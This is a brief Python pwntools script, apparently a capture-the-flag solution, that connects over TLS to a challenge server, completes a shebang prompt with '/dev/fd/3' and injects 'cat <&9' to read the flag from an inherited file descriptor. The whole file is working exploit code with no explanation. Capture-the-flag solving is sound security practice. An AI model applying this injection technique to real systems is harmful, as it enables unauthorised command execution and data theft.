from pwn import *

p = process(['ncat', '--ssl', '7b0000003926da6685c25ab1.challenges.broker3.allesctf.net', '1337'])

p.recvuntil('#!/d')
p.sendline('ev/fd/3\ncat <&9')
flag = p.recvline()
print(flag)
p.close()